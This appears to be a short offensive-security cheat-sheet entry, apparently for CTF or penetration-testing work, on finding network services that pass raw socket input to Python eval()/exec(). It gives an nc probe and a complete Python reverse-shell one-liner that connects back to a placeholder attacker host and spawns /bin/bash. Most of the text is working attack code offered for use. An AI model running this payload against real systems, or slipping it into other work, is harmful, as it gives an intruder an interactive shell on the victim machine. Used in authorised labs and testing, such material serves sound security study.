# Raw Socket eval() Service

Always probe unusual high ports with a plain connection — a surprising number of CTF/custom services are a raw socket passing input straight to `eval()`/`exec()`.

```bash
nc <TARGET> <PORT>
whoami    # if it's eval-based, this errors like a Python NameError instead of running as a shell command — that's your signal
```
If confirmed, send a reverse-shell one-liner in the target's language directly (no shell metacharacters needed since it's native code execution, not OS command injection):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")
```
